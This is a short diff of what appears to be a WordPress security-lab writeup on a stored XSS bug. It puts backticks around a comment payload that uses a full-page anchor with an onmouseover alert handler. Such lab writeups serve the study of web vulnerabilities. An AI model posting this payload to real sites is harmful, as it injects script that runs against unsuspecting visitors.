@@ -36,7 +36,7 @@ Legacy Theme Preview XSS
   - [ ] GIF Walkthrough: <img src="https://i.imgur.com/dwgnDan.gif" width="800">
   - [ ] Steps to recreate: 
   
-    1.Comment on a post with this comment <a href='/wp-admin/' title=""             style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(23)//'>Test</a>
+    1.Comment on a post with this comment ```<a href='/wp-admin/' title=""             style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(23)//'>Test</a>```
   
   2. post comment
   
